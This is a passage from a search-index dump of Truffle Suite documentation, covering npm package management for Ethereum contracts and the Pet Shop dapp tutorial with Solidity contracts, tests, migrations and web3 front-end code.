however, that ideal is going to take time to develop and reach critical mass. Until that time, we can use npm to distribute our contracts and applications like the rest of the Javascript community.", "title": "Truffle Suite"}, {"location": "guides/package-management/#get-the-beta-version", "text": "As this feature is in beta, you must first get the beta version of Truffle. To make sure the beta version doesn't conflict with the released version, first remove the Truffle version you have currently installed: $ npm uninstall -g truffle And then install the beta version: $ npm install -g truffle@beta", "title": "Get the Beta Version"}, {"location": "guides/package-management/#overview", "text": "Truffle Beta comes standard with npm integration, and is aware of the node_modules directory in your project if it exists. This means you can use and distribute contracts, dapps and Ethereum-enabled libraries via npm , making your code available to others and other's code available to you.", "title": "Overview"}, {"location": "guides/package-management/#package-layout", "text": "Projects created with Truffle have a specific layout by default which enables them to be used as packages. This layout isn't required, but if used as a common convention -- or \"de-facto standard\" -- then distributing contracts and dapps through package management will become much easier. The most important directories in a Truffle package are the following: /contracts /build (which includes /build/contracts , created by Truffle) The first directory is your contracts directory, which includes your raw Solidity contracts. The second directory is the build directory, and more specifically /build/contracts , which holds build artifacts in the form of .sol.js files. Including raw contracts in your package will allow others to import those contracts within their own solidity code. Similarly, including your .sol.js build artifacts in your package will allow others to seamlessly interact with your contracts from Javascript, which can be used in dapps, scripts and migrations.", "title": "Package Layout"}, {"location": "guides/package-management/#using-a-package", "text": "When using a package within your own project, it is important to note that there are two places where you might be interested in using other's contract code: within your contracts ( .sol files) and within your Javascript code ( .sol.js files). The following provides an example of each case, and discusses techniques for making the most of other's contracts and build artifacts.", "title": "Using a Package"}, {"location": "guides/package-management/#installing", "text": "For this example, we're going to use the Example Truffle Library , which provides a simple name registry that is deployed to the Morden test network. In order to use it as a dependency, we must first install it within our project through npm : $ cd my_project $ npm install example-truffle-library Note that the last command above downloads the package and places it in my_project/node_modules directory, which is important for the examples below. See the npm documentation for help using npm to install packages.", "title": "Installing"}, {"location": "guides/package-management/#within-your-contracts", "text": "To use a package's contracts within your contracts, this can be as simple as Solidity's import statement. When your import path isn't explicitly relative or absolute, this signifies to Truffle that you're looking for a file from a specific named package. Consider this example using the Example Truffle Library mentioned above: import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; Since the path didn't start with ./ , Truffle knows to look in your project's node_modules directory for the example-truffle-library folder. From there, it resolves the path to provide you the contract you requested.", "title": "Within Your Contracts"}, {"location": "guides/package-management/#within-javascript-code", "text": "To interact with package's contracts within Javascript code, you simply need to require that package's .sol.js files like so: var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); These files are provided by EtherPudding , which Truffle uses internally. See EtherPudding's documentation for more information.", "title": "Within Javascript Code"}, {"location": "guides/package-management/#packages-deployed-addresses", "text": "Sometimes you want your contracts to interact with the package's previously deployed contracts. Since the deployed addresses exist within the package's .sol.js files, you must perform an extra step to get those addresses into your contracts. To do so, make your contract accept the address of the dependency contract, and then use migrations. The following is an example contract that exists within your project as well as an example migration: Contract: MyContract.sol import \"example-truffle-library/contracts/SimpleNameRegistry.sol\" ; contract MyContract { SimpleNameRegistry registry ; address public owner ; function MyContract { owner = msg.sender ; } // Simple example that uses the deployed registry from the package. function getModule ( bytes32 name ) returns ( address ) { return registry . names ( name ); } // Set the registry if you're the owner. function setRegistry ( address addr ) { require ( msg.sender == owner ); registry = SimpleNameRegistry ( addr ); } } Migration: 3_hook_up_example_library.js var SimpleNameRegistry = require ( \"example-truffle-library/build/contracts/SimpleNameRegistry.sol.js\" ); module . exports = function ( deployer ) { // Deploy our contract, then set the address of the registry. deployer . deploy ( MyContract ). then ( function () { MyContract . deployed (). setRegistry ( SimpleNameRegistry . address ); }); };", "title": "Package's Deployed Addresses"}, {"location": "guides/package-management/#recommendation-use-the-testrpc", "text": "**Update**: Since this tutorial was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our [Ganache Quickstart](/docs/ganache/quickstart) page. The ethereumjs-testrpc is wildly useful for packages that were previously deployed to the live network. The TestRPC includes a --fork feature which allows you to fork from the main chain while developing your application. What this means for you is that you can develop and test against packages that are deployed live, using real data , without having to worry about deploying your dependency's contracts yourself.", "title": "Recommendation: Use the TestRPC"}, {"location": "guides/package-management/#the-future-where-do-we-go-from-here", "text": "Node's npm is, of course, a centralized service, and the packages that exist there are on a centralized network. As Ethereum becomes more widespread, so will the urge to decentralize all of our tools and packages. The ideal package management system for Ethereum is one where the package registry exists on the live chain and the package data exists on a decentralized file storage network like IPFS or Swarm; however, that ideal is going to take time to develop and reach critical mass. Until that time, we can use npm to distribute our contracts and applications like the rest of the Javascript community.", "title": "The Future: Where do we go from here?"}, {"location": "guides/pet-shop/", "text": "This tutorial will take you through the process of building your first dapp---an adoption tracking system for a pet shop! This tutorial is meant for those with a basic knowledge of Ethereum and smart contracts, who have some knowledge of HTML and JavaScript, but who are new to dapps. Note : For Ethereum basics, please read the Truffle Ethereum Overview tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project using a Truffle Box Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating a user interface to interact with the smart contract Interacting with the dapp in a browser Background \u00b6 Pete Scandlon of Pete's Pet Shop is interested in using Ethereum as an efficient way to handle their pet adoptions. The store has space for 16 pets at a given time, and they already have a database of pets. As an initial proof of concept, Pete wants to see a dapp which associates an Ethereum address with a pet to be adopted. The website structure and styling will be supplied. Our job is to write the smart contract and front-end logic for its usage. Setting up the development environment \u00b6 There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Git Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. We also will be using Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. You can download Ganache by navigating to https://trufflesuite.com/ganache and clicking the \"Download\" button. Note : If you are developing in an environment without a graphical interface, you can also use Truffle Develop, Truffle's built-in personal blockchain, instead of Ganache. You will need to change some settings---such as the port the blockchain runs on---to adapt the tutorial for Truffle Develop. Creating a Truffle project using a Truffle Box \u00b6 Truffle initializes in the current directory, so first create a directory in your development folder of choice and then moving inside it. mkdir pet-shop-tutorial cd pet-shop-tutorial We've created a special Truffle Box just for this tutorial called pet-shop , which includes the basic project structure as well as code for the user interface. Use the truffle unbox command to unpack this Truffle Box. truffle unbox pet-shop Note : Truffle can be initialized a few different ways. Another useful initialization command is `truffle init`, which creates an empty Truffle project with no example contracts included. For more information, please see the documentation on Creating a project . Directory structure \u00b6 The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts truffle-config.js : Truffle configuration file The pet-shop Truffle Box has extra files and folders in it, but we won't worry about those just yet. Writing the smart contract \u00b6 We'll start our dapp by writing the smart contract that acts as the back-end logic and storage. Create a new file named Adoption.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract Adoption { } Things to notice: The minimum version of Solidity required is noted at the top of the contract: pragma solidity ^0.5.0; . The pragma command means \" additional information that only the compiler cares about \", while the caret symbol (^) means \" the version indicated or higher \". Like JavaScript or PHP, statements are terminated with semicolons. Variable setup \u00b6 Solidity is a statically-typed language, meaning data types like strings, integers, and arrays must be defined. Solidity has a unique type called an address . Addresses are Ethereum addresses, stored as 20 byte values. Every account and smart contract on the Ethereum blockchain has an address and can send and receive Ether to and from this address. Add the following variable on the next line after contract Adoption { . address [ 16 ] public adopters ; Things to notice: We've defined a single variable: adopters . This is an array of Ethereum addresses. Arrays contain one type and can have a fixed or variable length. In this case the type is address and the length is 16 . You'll also notice adopters is public. Public variables have automatic getter methods, but in the case of arrays a key is required and will only return a single value. Later, we'll write a function to return the whole array for use in our UI. Your first function: Adopting a pet \u00b6 Let's allow users to make adoption requests. Add the following function to the smart contract after the variable declaration we set up above. // Adopting a pet function adopt ( uint petId ) public returns ( uint ) { require ( petId >= 0 && petId <= 15 ); adopters [ petId ] = msg.sender ; return petId ; } Things to notice: In Solidity the types of both the function parameters and output must be specified. In this case we'll be taking in a petId (integer) and returning an integer. We are checking to make sure petId is in range of our adopters array. Arrays in Solidity are indexed from 0, so the ID value will need to be between 0 and 15. We use the require() statement to ensure the ID is within range. If the ID is in range, we then add the address that made the call to our adopters array. The address of the person or smart contract who called this function is denoted by msg.sender . Finally, we return the petId provided as a confirmation. Your second function: Retrieving the adopters \u00b6 As mentioned above, array getters return only a single value from a given key. Our UI needs to update all pet adoption statuses, but making 16 API calls is not ideal. So our next step is to write a function to return the entire array. Add the following getAdopters() function to the smart contract, after the adopt() function we added above: // Retrieving the adopters function getAdopters () public view returns ( address [ 16 ] memory ) { return adopters ; } Things to notice: Since adopters is already declared, we can simply return it. Be sure to specify the return type (in this case, the type for adopters ) as address[16] memory . memory gives the data location for the variable. The view keyword in the function declaration means that the function will not modify the state of the contract. Further information about the exact limits imposed by view is available here . Compiling and migrating the smart contract \u00b6 Now that we have written our smart contract, the next steps are to compile and migrate it. Compilation \u00b6 Solidity is a compiled language, meaning we need to compile our Solidity to bytecode for the Ethereum Virtual Machine (EVM) to execute. Think of it as translating our human-readable Solidity into something the EVM understands. In a terminal, make sure you are in the root of the directory that contains the dapp and type: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . You should see output similar to the following: Compiling your contracts... =========================== > Compiling ./contracts/Adoption.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /Users/cruzmolina/Code/truffle-projects/metacoin/build/contracts > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang Migration \u00b6 Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! A migration is a deployment script meant to alter the state of your application's contracts , moving it from one state to the next. For the first migration, you might just be deploying new code, but over time, other migrations might move data around or replace a contract with a new one. Note : Read more about migrations in the Truffle documentation . You'll see one JavaScript file already in the migrations/ directory: 1_initial_migration.js . This handles deploying the Migrations.sol contract to observe subsequent smart contract migrations, and ensures we don't double-migrate unchanged contracts in the future. Now we are ready to create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: var Adoption = artifacts . require ( \"Adoption\" ); module . exports = function ( deployer ) { deployer . deploy ( Adoption ); }; Before we can migrate our contract to the blockchain, we need to have a blockchain running. For this tutorial, we're going to use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. Note : Read more about Ganache in the Truffle documentation . Back in our terminal, migrate the contract to the blockchain. truffle migrate You should see output similar to the following: 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3b558e9cdf1231d8ffb3445cb2f9fb01de9d0363e0b97a17f9517da318c2e5af > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 > account: 0x8d9606F90B6CA5D856A9f0867a82a645e2DfFf37 > balance: 99 .99430184 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'Adoption' ............................. ............................. You can see the migrations being executed in order, followed by some information related to each migration. (Your information will differ.) In Ganache, note that the state of the blockchain has changed. The blockchain now shows that the current block, previously 0 , is now 4 . In addition, while the first account originally had 100 ether, it is now lower, due to the transaction costs of migration. We'll talk more about transaction costs later. You've now written your first smart contract and deployed it to a locally running blockchain. It's time to interact with our smart contract now to make sure it does what we want. Testing the smart contract using Solidity \u00b6 Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Solidity. Create a new file named TestAdoption.sol in the test/ directory. Add the following content to the TestAdoption.sol file: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/Adoption.sol\" ; contract TestAdoption { // The address of the adoption contract to be tested Adoption adoption = Adoption ( DeployedAddresses . Adoption ()); // The id of the pet that will be used for testing uint expectedPetId = 8 ; //The expected owner of adopted pet is this contract address expectedAdopter = address ( this ); } We start the contract off with 3 imports: Assert.sol : Gives us various assertions to use in our tests. In testing, an assertion checks for things like equality, inequality or emptiness to return a pass/fail from our test. Here's a full list of the assertions included with Truffle . DeployedAddresses.sol : When running tests, Truffle will deploy a fresh instance of the contract being tested to the blockchain. This smart contract gets the address of the deployed contract. Adoption : The smart contract we want to test. Note : The first two imports are referring to global Truffle files, not a `truffle` directory. You should not see a `truffle` directory inside your `test/` directory. Then we define three contract-wide variables: * First, one containing the smart contract to be tested, calling the DeployedAddresses smart contract to get its address. * Second, the id of the pet that will be used to test the adoption functions. * Third, since the TestAdoption contract will be sending the transaction, we set the expected adopter address to this , a contract-wide variable that gets the current contract's address. Testing the adopt() function \u00b6 To test the adopt() function, recall that upon success it returns the given petId . We can ensure an ID was returned and that it's correct by comparing the return value of adopt() to the ID we passed in. Add the following function within the TestAdoption.sol smart contract, after the declaration of Adoption : // Testing the adopt() function function testUserCanAdoptPet () public { uint returnedId = adoption . adopt ( expectedPetId ); Assert . equal ( returnedId , expectedPetId , \"Adoption of the expected pet should match what is returned.\" ); } Things to notice: We call the smart contract we declared earlier with the ID of expectedPetId . Finally, we pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to Assert.equal() . Testing retrieval of a single pet's owner \u00b6 Remembering from above that public variables have automatic getter methods, we can retrieve the address stored by our adoption test above. Stored data will persist for the duration of our tests, so our adoption of pet expectedPetId above can be retrieved by other tests. Add this function below the previously added function in TestAdoption.sol . // Testing retrieval of a single pet's owner function testGetAdopterAddressByPetId () public { address adopter = adoption . adopters ( expectedPetId ); Assert . equal ( adopter , expectedAdopter , \"Owner of the expected pet should be this contract\" ); } After getting the adopter address stored by the adoption contract, we assert equality as we did above. Testing retrieval of all pet owners \u00b6 Since arrays can only return a single value given a single key, we create our own getter for the entire array. Add this function below the previously added function in TestAdoption.sol . // Testing retrieval of all pet owners function testGetAdopterAddressByPetIdInArray () public { // Store adopters in memory rather than contract's storage address [ 16 ] memory adopters = adoption . getAdopters (); Assert . equal ( adopters [ expectedPetId ], expectedAdopter , \"Owner of the expected pet should be this contract\" ); } Note the memory attribute on adopters . The memory attribute tells Solidity to temporarily store the value in memory, rather than saving it to the contract's storage. Since adopters is an array, and we know from the first adoption test that we adopted pet expectedPetId , we compare the testing contracts address with location expectedPetId in the array. Testing the smart contract using JavaScript \u00b6 Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Javascript using the Chai and Mocha libraries. Create a new file named testAdoption.test.js in the test/ directory. Add the following content to the testAdoption.test.js file: const Adoption = artifacts.require(\"Adoption\"); contract(\"Adoption\", (accounts) => { let adoption; let expectedPetId; before(async () => { adoption = await Adoption.deployed(); }); describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); }); }); We start the contract by importing : * Adoption : The smart contract we want to test We begin our test by importing our Adoption contract using artifacts.require . Note : When writing this test, our callback function take the argument accounts . This provides us with the accounts available on the network when using this test. Then, we make use of the before to provide initial setups for the following: * Adopt a pet with id 8 and assign it to the first account within the test accounts on the network. * This function later is used to check whether the petId: 8 has been adopted by accounts[0] . ### Testing the adopt function To test the adopt function, recall that upon success it returns the given adopter . We can ensure that the adopter based on given petID was returned and is compared with the expectedAdopter within the adopt function. Add the following function within the testAdoption.test.js test file, after the declaration of before code block. describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); it(\"can fetch the address of an owner by pet id\", async () => { const adopter = await adoption.adopters(8); assert.equal(adopter, expectedAdopter, \"The owner of the adopted pet should be the first account.\"); }); }); Things to notice: We call smart contract method adopters to see what address adopted the pet with petID 8. Truffle imports Chai for the user so we can use the assert functions. We pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to assert.equal() . ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. Add this function below the previously added function in testAdoption.test.js . it(\"can fetch the collection of all pet owners' addresses\", async () => { const adopters = await adoption.getAdopters(); assert.equal(adopters[8], expectedAdopter, \"The owner of the adopted pet should be in the collection.\"); }); Since adopters is an array, and we know from the first adoption test that we adopted the pet with petId 8, we are comparing the contract's address with the address that we expect to find. Running the tests \u00b6 Back in the terminal, run the tests: truffle test If all the tests pass, you'll see console output similar to this: Using network 'development' . Compiling your contracts... =========================== > Compiling ./test/TestAdoption.sol > Artifacts written to /var/folders/z3/v0sd04ys11q2sh8tq38mz30c0000gn/T/test-11934-19747-g49sra.0ncrr > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang TestAdoption \u2713 testUserCanAdoptPet ( 91ms ) \u2713 testGetAdopterAddressByPetId ( 70ms ) \u2713 testGetAdopterAddressByPetIdInArray ( 89ms ) 3 passing ( 670ms ) Creating a user interface to interact with the smart contract \u00b6 Now that we've created the smart contract, deployed it to our local test blockchain and confirmed we can interact with it via the console, it's time to create a UI so that Pete has something to use for his pet shop! Included with the pet-shop Truffle Box was code for the app's front-end. That code exists within the src/ directory. The front-end doesn't use a build system (webpack, grunt, etc.) to be as easy as possible to get started. The structure of the app is already there; we'll be filling in the functions which are unique to Ethereum. This way, you can take this knowledge and apply it to your own front-end development. Instantiating web3 \u00b6 Open /src/js/app.js in a text editor. Examine the file. Note that there is a global App object to manage our application, load in the pet data in init() and then call the function initWeb3() . The web3 JavaScript library interacts with the Ethereum blockchain. It can retrieve user accounts, send transactions, interact with smart contracts, and more. Remove the multi-line comment from within initWeb3 and replace it with the following: // Modern dapp browsers... if ( window . ethereum ) { App . web3Provider = window . ethereum ; try { // Request account access await window . ethereum . enable (); } catch ( error ) { // User denied account access... console . error ( \"User denied account access\" ) } } // Legacy dapp browsers... else if ( window . web3 ) { App . web3Provider = window . web3 . currentProvider ; } // If no injected web3 instance is detected, fall back to Ganache else { App . web3Provider = new Web3 . providers . HttpProvider ( 'http://localhost:7545' ); } web3 = new Web3 ( App . web3Provider ); Things to notice: First, we check if we are using modern dapp browsers or the more recent versions of MetaMask where an ethereum provider is injected into the window object. If so, we use it to create our web3 object, but we also need to explicitly request access to the accounts with ethereum.enable() . If the ethereum object does not exist, we then check for an injected web3 instance. If it exists, this indicates that we are using an older dapp browser (like Mist or an older version of MetaMask). If so, we get its provider and use it to create our web3 object. If no injected web3 instance is present, we create our web3 object based on our local provider. (This fallback is fine for development environments, but insecure and not suitable for production.) Instantiating the contract \u00b6 Now that we can interact with Ethereum via web3, we need to instantiate our smart contract so web3 knows where to find it and how it works. Truffle has a library to help with this called @truffle/contract . It keeps information about the contract in sync with migrations, so you don't need to change the contract's deployed address manually. Still in /src/js/app.js , remove the multi-line comment from within initContract and replace it with the following: $ . getJSON ( 'Adoption.json' , function ( data ) { // Get the necessary contract artifact file and instantiate it with @truffle/contract var AdoptionArtifact = data ; App . contracts . Adoption = TruffleContract ( AdoptionArtifact ); // Set the provider for our contract App . contracts . Adoption . setProvider ( App . web3Provider ); // Use our contract to retrieve and mark the adopted pets return App . markAdopted (); }); Things to notice: We first retrieve the artifact file for our smart contract. Artifacts are information about our contract such as its deployed address and Application Binary Interface (ABI) . The ABI is a JavaScript object defining how to interact with the contract including its variables, functions and their parameters. Once we have the artifacts in our callback, we pass them to TruffleContract() . This creates an instance of the contract we can interact with. With our contract instantiated, we set its web3 provider using the App.web3Provider value we stored earlier when setting up web3. We then call the app's markAdopted() function in case any pets are already adopted from a previous visit. We've encapsulated this in a separate function since we'll need to update the UI any time we make a change to the smart contract's data. Getting The Adopted Pets and Updating The UI \u00b6 Still in /src/js/app.js , remove the multi-line comment from markAdopted and replace it with the following: var adoptionInstance ; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; return adoptionInstance . getAdopters . call (); }). then ( function ( adopters ) { for ( i = 0 ; i < adopters . length ; i ++ ) { if ( adopters [ i ] !== '0x0000000000000000000000000000000000000000' ) { $ ( '.panel-pet' ). eq ( i ). find ( 'button' ). text ( 'Success' ). attr ( 'disabled' , true ); } } }). catch ( function ( err ) { console . log ( err . message ); }); Things to notice: We access the deployed Adoption contract, then call getAdopters() on that instance. We first declare the variable adoptionInstance outside of the smart contract calls so we can access the instance after initially retrieving it. Using call() allows us to read data from the blockchain without having to send a full transaction, meaning we won't have to spend any ether. After calling getAdopters() , we then loop through all of them, checking to see if an address is stored for each pet. Since the array contains address types, Ethereum initializes the array with 16 empty addresses. This is why we check for an empty address string rather than null or other falsey value. Once a petId with a corresponding address is found, we disable its adopt button and change the button text to \"Success\", so the user gets some feedback. Any errors are logged to the console. Handling the adopt() Function \u00b6 Still in /src/js/app.js , remove the multi-line comment from handleAdopt and replace it with the following: var adoptionInstance ; web3 . eth . getAccounts ( function ( error , accounts ) { if ( error ) { console . log ( error ); } var account = accounts [ 0 ]; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; // Execute adopt as a transaction by sending account return adoptionInstance . adopt ( petId , { from : account }); }). then ( function ( result ) { return App . markAdopted (); }). catch ( function ( err ) { console . log ( err . message ); }); }); Things to notice: We use web3 to get the user's accounts. In the callback after an error check, we then select the first account. From there, we get the deployed contract as we did above and store the instance in adoptionInstance . This time though, we're going to send a transaction instead of a call. Transactions require a \"from\" address and have an associated cost. This cost, paid in ether, is called gas . The gas cost is the fee for performing computation and/or storing data in a smart contract. We send the transaction by executing the adopt() function with both the pet's ID and an object containing the account address, which we stored earlier in account . The result of sending a transaction is the transaction object. If there are no errors, we proceed to call our markAdopted() function to sync the UI with our newly stored data. Interacting with the dapp in a browser \u00b6 Now we're ready to use our dapp! Installing and configuring MetaMask \u00b6 The easiest way to interact with our dapp in a browser is through MetaMask , a browser extension for both Chrome and Firefox. Install MetaMask in your browser. Once installed, a tab in your browser should open displaying the following: After clicking Getting Started , you should see the initial MetaMask screen. Click Import Wallet . Next, you should see a screen requesting anonymous analytics. Choose to decline or agree. In the box marked Wallet Seed , enter the mnemonic that is displayed in Ganache. **Warning**: Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Enter a password below that and click OK . If all goes well, MetaMask should display the following screen. Click All Done . Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . In the box titled \"New Network\" enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say http://127.0.0.1:7545 . Click the top-right X to close out of Settings and return to the Accounts page. Each account created by Ganache is given 100 ether. You'll notice it's slightly less on the first account because some gas was used when the contract itself was deployed and when the tests were run. Configuration is now complete. Installing and configuring lite-server \u00b6 We can now start a local web server and use the dapp. We're using the lite-server library to serve our static files. This shipped with the pet-shop Truffle Box, but let's take a look at how it works. Open bs-config.json in a text editor (in the project's root directory) and examine the contents: { \"server\" : { \"baseDir\" : [ \"./src\" , \"./build/contracts\" ] } } This tells lite-server which files to include in our base directory. We add the ./src directory for our website files and ./build/contracts directory for the contract artifacts. We've also added a dev command to the scripts object in the package.json file in the project's root directory. The scripts object allows us to alias console commands to a single npm command. In this case we're just doing a single command, but it's possible to have more complex configurations. Here's what yours should look like: \"scripts\" : { \"dev\" : \"lite-server\" , \"test\" : \"echo \\\"Error: no test specified\\\" && exit 1\" }, This tells npm to run our local install of lite-server when we execute npm run dev from the console. Using the dapp \u00b6 Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. A MetaMask pop-up should appear requesting your approval to allow Pete's Pet Shop to connect to your MetaMask wallet. Without explicit approval, you will be unable to interact with the dapp. Click Connect . To use the dapp, click the Adopt button on the pet of your choice. You'll be automatically prompted to approve the transaction by MetaMask. Click Submit to approve the transaction. You'll see the button next to the adopted pet change to say \"Success\" and become disabled, just as we specified, because the pet has now been adopted. Note : If the button doesn't automatically change to say \"Success\", refreshing the app in the browser should trigger it. And in MetaMask, you'll see the transaction listed: You'll also see the same transaction listed in Ganache under the \"Transactions\" section. Congratulations! You have taken a huge step to becoming a full-fledged dapp developer. For developing locally, you have all the tools you need to start making more advanced dapps. If you'd like to make your dapp live for others to use, stay tuned for our future tutorial on deploying to the Ropsten testnet.", "title": "Truffle Suite"}, {"location": "guides/pet-shop/#background", "text": "Pete Scandlon of Pete's Pet Shop is interested in using Ethereum as an efficient way to handle their pet adoptions. The store has space for 16 pets at a given time, and they already have a database of pets. As an initial proof of concept, Pete wants to see a dapp which associates an Ethereum address with a pet to be adopted. The website structure and styling will be supplied. Our job is to write the smart contract and front-end logic for its usage.", "title": "Background"}, {"location": "guides/pet-shop/#setting-up-the-development-environment", "text": "There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Git Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. We also will be using Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. You can download Ganache by navigating to https://trufflesuite.com/ganache and clicking the \"Download\" button. Note : If you are developing in an environment without a graphical interface, you can also use Truffle Develop, Truffle's built-in personal blockchain, instead of Ganache. You will need to change some settings---such as the port the blockchain runs on---to adapt the tutorial for Truffle Develop.", "title": "Setting up the development environment"}, {"location": "guides/pet-shop/#creating-a-truffle-project-using-a-truffle-box", "text": "Truffle initializes in the current directory, so first create a directory in your development folder of choice and then moving inside it. mkdir pet-shop-tutorial cd pet-shop-tutorial We've created a special Truffle Box just for this tutorial called pet-shop , which includes the basic project structure as well as code for the user interface. Use the truffle unbox command to unpack this Truffle Box. truffle unbox pet-shop Note : Truffle can be initialized a few different ways. Another useful initialization command is `truffle init`, which creates an empty Truffle project with no example contracts included. For more information, please see the documentation on Creating a project .", "title": "Creating a Truffle project using a Truffle Box"}, {"location": "guides/pet-shop/#directory-structure", "text": "The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts truffle-config.js : Truffle configuration file The pet-shop Truffle Box has extra files and folders in it, but we won't worry about those just yet.", "title": "Directory structure"}, {"location": "guides/pet-shop/#writing-the-smart-contract", "text": "We'll start our dapp by writing the smart contract that acts as the back-end logic and storage. Create a new file named Adoption.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract Adoption { } Things to notice: The minimum version of Solidity required is noted at the top of the contract: pragma solidity ^0.5.0; . The pragma command means \" additional information that only the compiler cares about \", while the caret symbol (^) means \" the version indicated or higher \". Like JavaScript or PHP, statements are terminated with semicolons.", "title": "Writing the smart contract"}, {"location": "guides/pet-shop/#variable-setup", "text": "Solidity is a statically-typed language, meaning data types like strings, integers, and arrays must be defined. Solidity has a unique type called an address . Addresses are Ethereum addresses, stored as 20 byte values. Every account and smart contract on the Ethereum blockchain has an address and can send and receive Ether to and from this address. Add the following variable on the next line after contract Adoption { . address [ 16 ] public adopters ; Things to notice: We've defined a single variable: adopters . This is an array of Ethereum addresses. Arrays contain one type and can have a fixed or variable length. In this case the type is address and the length is 16 . You'll also notice adopters is public. Public variables have automatic getter methods, but in the case of arrays a key is required and will only return a single value. Later, we'll write a function to return the whole array for use in our UI.", "title": "Variable setup"}, {"location": "guides/pet-shop/#your-first-function-adopting-a-pet", "text": "Let's allow users to make adoption requests. Add the following function to the smart contract after the variable declaration we set up above. // Adopting a pet function adopt ( uint petId ) public returns ( uint ) { require ( petId >= 0 && petId <= 15 ); adopters [ petId ] = msg.sender ; return petId ; } Things to notice: In Solidity the types of both the function parameters and output must be specified. In this case we'll be taking in a petId (integer) and returning an integer. We are checking to make sure petId is in range of our adopters array. Arrays in Solidity are indexed from 0, so the ID value will need to be between 0 and 15. We use the require() statement to ensure the ID is within range. If the ID is in range, we then add the address that made the call to our adopters array. The address of the person or smart contract who called this function is denoted by msg.sender . Finally, we return the petId provided as a confirmation.", "title": "Your first function: Adopting a pet"}, {"location": "guides/pet-shop/#your-second-function-retrieving-the-adopters", "text": "As mentioned above, array getters return only a single value from a given key. Our UI needs to update all pet adoption statuses, but making 16 API calls is not ideal. So our next step is to write a function to return the entire array. Add the following getAdopters() function to the smart contract, after the adopt() function we added above: // Retrieving the adopters function getAdopters () public view returns ( address [ 16 ] memory ) { return adopters ; } Things to notice: Since adopters is already declared, we can simply return it. Be sure to specify the return type (in this case, the type for adopters ) as address[16] memory . memory gives the data location for the variable. The view keyword in the function declaration means that the function will not modify the state of the contract. Further information about the exact limits imposed by view is available here .", "title": "Your second function: Retrieving the adopters"}, {"location": "guides/pet-shop/#compiling-and-migrating-the-smart-contract", "text": "Now that we have written our smart contract, the next steps are to compile and migrate it.", "title": "Compiling and migrating the smart contract"}, {"location": "guides/pet-shop/#compilation", "text": "Solidity is a compiled language, meaning we need to compile our Solidity to bytecode for the Ethereum Virtual Machine (EVM) to execute. Think of it as translating our human-readable Solidity into something the EVM understands. In a terminal, make sure you are in the root of the directory that contains the dapp and type: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . You should see output similar to the following: Compiling your contracts... =========================== > Compiling ./contracts/Adoption.sol > Compiling ./contracts/Migrations.sol > Artifacts written to 